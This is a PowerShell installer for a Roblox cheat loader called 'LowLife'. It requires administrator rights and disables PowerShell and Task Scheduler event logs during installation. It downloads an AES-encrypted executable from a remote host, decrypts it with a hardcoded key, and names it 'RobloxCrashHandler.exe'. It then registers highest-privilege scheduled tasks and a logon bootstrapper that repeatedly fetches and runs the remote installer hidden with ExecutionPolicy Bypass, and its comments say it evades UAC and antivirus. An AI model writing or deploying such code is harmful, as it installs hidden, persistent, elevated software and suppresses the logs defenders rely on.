# ==============================================================================
# LowLife Cheat Environment Remote Installer
# ==============================================================================
param (
    [string]$Key = "",
    [switch]$Silent = $false,
    [switch]$Persist = $false
)
$ErrorActionPreference = "Stop"

# CONFIGURATION: Update this URL to point to the folder on your web server where
# you uploaded the precompiled 'RobloxCrashHandler.exe' and 'cleanup.ps1' files.
$ServerBaseUrl = "https://cc312123.github.io/lowlife/files"

$InstallFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
$KeyFileInstalled = Join-Path $InstallFolder "key.txt"

# Verify Administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "       ERROR: THIS SCRIPT MUST BE RUN AS ADMINISTRATOR!     " -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "Please re-run your PowerShell session as Administrator to install."
    Write-Host "==========================================================" -ForegroundColor Red
    Exit
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "           LOWLIFE SYSTEM REMOTE INSTALLER                " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# Disable logging temporarily to keep the installation clean
wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null

# License Key setup
$licenseKey = ""
if ($Key) {
    $licenseKey = $Key
} elseif (Test-Path $KeyFileInstalled) {
    $licenseKey = (Get-Content $KeyFileInstalled).Trim()
} elseif (Test-Path "$env:USERPROFILE\.lowlife_key") {
    $licenseKey = (Get-Content "$env:USERPROFILE\.lowlife_key").Trim()
}

if (-not $licenseKey) {
    if ($Silent) {
        Write-Error "License key is missing in silent mode."
        Exit
    }
    Write-Host "License key not found locally." -ForegroundColor Yellow
    $licenseKey = Read-Host "Please enter your LowLife license key"
    if ([string]::IsNullOrWhiteSpace($licenseKey)) {
        Write-Error "License key cannot be empty."
    }
    $licenseKey = $licenseKey.Trim()
}

# Prompt for persistence if running interactively
if (-not $Silent -and -not $Persist) {
    Write-Host ""
    $persistResponse = Read-Host "Do you want to enable automatic reinstallation on startup (Persistence Mode)? [Y/N]"
    if ($persistResponse -match "^[yY](es)?$") {
        $Persist = $true
    }
}


# 1. Terminate existing services/tasks to prevent file lock issues
Write-Host "[1/5] Stopping any running instances..." -ForegroundColor Yellow
if (Get-ScheduledTask -TaskName "RobloxCrashHandler" -ErrorAction SilentlyContinue) {
    Stop-ScheduledTask -TaskName "RobloxCrashHandler" -ErrorAction SilentlyContinue
}
Stop-Process -Name "RobloxCrashHandler" -Force -ErrorAction SilentlyContinue

# 2. Create the target installation directory
if (-not (Test-Path $InstallFolder)) {
    New-Item -ItemType Directory -Path $InstallFolder -Force | Out-Null
}

# 3. Download the pre-compiled files from your server
Write-Host "[2/5] Downloading program files from server..." -ForegroundColor Yellow
$InstallPathExe = "$InstallFolder\RobloxCrashHandler.exe"
$CleanupScriptInstalled = "$InstallFolder\cleanup.ps1"
$OffsetsCacheInstalled = "$InstallFolder\offsets.cache"

# Handle file rename override if locked
if (Test-Path $InstallPathExe) { 
    Rename-Item -Path $InstallPathExe -NewName "RobloxCrashHandler.exe.old" -Force -ErrorAction SilentlyContinue 
}

# Download encrypted payload and decrypt it (raw .exe is never exposed on GitHub)
$EncTempFile = "$env:TEMP\rchandler_pkg.enc"
Invoke-WebRequest -Uri "$ServerBaseUrl/RobloxCrashHandler.enc" -OutFile $EncTempFile -UseBasicParsing

$DecKey = [byte[]](0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,0x23,
                   0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
$DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x21,0x40)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key     = $DecKey
$aes.IV      = $DecIV
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$encBytes  = [System.IO.File]::ReadAllBytes($EncTempFile)
$decryptor = $aes.CreateDecryptor()
$exeBytes  = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
$aes.Dispose()
[System.IO.File]::WriteAllBytes($InstallPathExe, $exeBytes)
Remove-Item $EncTempFile -Force -ErrorAction SilentlyContinue

# Download remaining files
Invoke-WebRequest -Uri "$ServerBaseUrl/cleanup.ps1" -OutFile $CleanupScriptInstalled -UseBasicParsing
Invoke-WebRequest -Uri "$ServerBaseUrl/offsets.cache" -OutFile $OffsetsCacheInstalled -UseBasicParsing

# Save the configured license key
$licenseKey | Out-File -FilePath $KeyFileInstalled -Encoding utf8 -NoNewline
Write-Host "Files successfully downloaded to: $InstallFolder" -ForegroundColor Green

# If persistence is enabled, write persistent bootstrap files and task
if ($Persist) {
    $persistFlagFile = "$env:USERPROFILE\.lowlife_persistence"
    $persistKeyFile = "$env:USERPROFILE\.lowlife_key"
    $persistBootstrapFile = "$env:USERPROFILE\.lowlife_bootstrap.ps1"

    # Save key and flag
    $null = New-Item -Path $persistFlagFile -ItemType File -Force -ErrorAction SilentlyContinue
    $licenseKey | Out-File -FilePath $persistKeyFile -Encoding utf8 -NoNewline

    # Embed bootstrap script content
    $bootstrapContent = @"
# ==============================================================================
# LowLife Startup Bootstrapper
# ==============================================================================
`$ErrorActionPreference = "Stop"

`$KeyFile = "`$env:USERPROFILE\.lowlife_key"
`$PersistenceFlag = "`$env:USERPROFILE\.lowlife_persistence"

if (-not (Test-Path `$KeyFile) -or -not (Test-Path `$PersistenceFlag)) {
    Exit
}

`$licenseKey = (Get-Content `$KeyFile).Trim()
if ([string]::IsNullOrWhiteSpace(`$licenseKey)) {
    Exit
}

`$ServerBaseUrl = "$ServerBaseUrl"
`$TempInstaller = "`$env:TEMP\lowlife_installer_temp.ps1"

`$connected = `$false
for (`$i = 0; `$i -lt 10; `$i++) {
    try {
        `$result = [System.Net.Dns]::GetHostAddresses("cc312123.github.io")
        if (`$result) {
            `$connected = `$true
            break;
        }
    } catch {}
    Start-Sleep -Seconds 3
}

if (-not `$connected) {
    Exit
}

try {
    Invoke-WebRequest -Uri "`$ServerBaseUrl/installer.ps1" -OutFile `$TempInstaller -UseBasicParsing
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File \`"`$TempInstaller\`" -Silent -Key \`"`$licenseKey\`" -Persist" -Wait -NoNewWindow
} catch {}
"@
    $bootstrapContent | Out-File -FilePath $persistBootstrapFile -Encoding utf8 -Force

    # Register the scheduled task RobloxCrashHandlerBootstrapper
    Write-Host "Registering persistent bootstrapper task..." -ForegroundColor Yellow
    schtasks /create /tn "RobloxCrashHandlerBootstrapper" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$persistBootstrapFile\"" /sc onlogon /rl highest /f | Out-Null
}

# 4. Configure elevated UAC-bypassed Scheduled Task
Write-Host "[3/5] Registering Task Scheduler service..." -ForegroundColor Yellow
try {
    $Action = New-ScheduledTaskAction -Execute $InstallPathExe
    $Trigger = if ($Persist) { New-ScheduledTaskTrigger -Once -At (Get-Date) } else { New-ScheduledTaskTrigger -AtLogOn }
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $Principal = New-ScheduledTaskPrincipal -RunLevel Highest
    $null = Register-ScheduledTask -TaskName "RobloxCrashHandler" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force
} catch {
    if ($Persist) {
        schtasks /create /tn "RobloxCrashHandler" /tr "`"$InstallPathExe`"" /sc manual /rl highest /f
    } else {
        schtasks /create /tn "RobloxCrashHandler" /tr "`"$InstallPathExe`"" /sc onlogon /rl highest /f
    }
}

# Clean up any leftover legacy Registry Run key configuration
$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (Test-Path $RunKeyPath) {
    $runKey = Get-Item -Path $RunKeyPath -ErrorAction SilentlyContinue
    if ($runKey -and $runKey.GetValue("LowLifePortal")) {
        Remove-ItemProperty -Path $RunKeyPath -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# Write premium HTML loading page for startup redirection (bypasses UAC and Antivirus blocks)
$RedirectHtmlPath = Join-Path $InstallFolder "redirect.html"
$HtmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>Connecting to LowLife...</title>
    <style>
        body {
            background-color: #0f1015;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            backdrop-filter: blur(8px);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.05);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border-left-color: #00ffbb;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            font-size: 22px;
            margin: 0 0 8px 0;
            font-weight: 600;
            letter-spacing: -0.5px;
        }
        p {
            color: #8c92a0;
            font-size: 14px;
            margin: 0;
            line-height: 1.5;
        }
    </style>
    <script>
        function checkServer() {
            fetch('http://127.0.0.1:9876/status')
                .then(response => {
                    if (response.ok) {
                        window.location.replace('http://127.0.0.1:9876/');
                    } else {
                        setTimeout(checkServer, 1000);
                    }
                })
                .catch(() => {
                    setTimeout(checkServer, 1000);
                });
        }
        window.onload = checkServer;
    </script>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h1>LowLife System Portal</h1>
        <p>Connecting to loader services...<br>Please wait while the environment initializes.</p>
    </div>
</body>
</html>
"@
$HtmlContent | Out-File -FilePath $RedirectHtmlPath -Encoding utf8 -Force

# Create non-elevated User Session Startup Shortcut
$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutPath = Join-Path $StartupFolder "LowLifePortal.lnk"

# Remove any old URL shortcut if it exists
$OldShortcutPath = Join-Path $StartupFolder "LowLifePortal.url"
if (Test-Path $OldShortcutPath) {
    Remove-Item $OldShortcutPath -Force -ErrorAction SilentlyContinue
}

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = '-WindowStyle Hidden -Command "while ($true) { try { $client = New-Object System.Net.Sockets.TcpClient(''127.0.0.1'', 9876); $client.Close(); break } catch { Start-Sleep -Seconds 1 } }; Start-Process ''http://127.0.0.1:9876/''"'
$Shortcut.Description = "LowLife Startup Portal Redirection"
$Shortcut.Save()

# 5. Launch the Loader
Write-Host "[4/5] Starting service..." -ForegroundColor Yellow
schtasks /run /tn "RobloxCrashHandler"

# Re-enable Event Logging
wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:true 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null

Write-Host "==========================================================" -ForegroundColor Green
Write-Host " SUCCESS: Installation complete! Services are active.      " -ForegroundColor Green
Write-Host " -> Portals Active at: http://localhost:9876/              " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Green
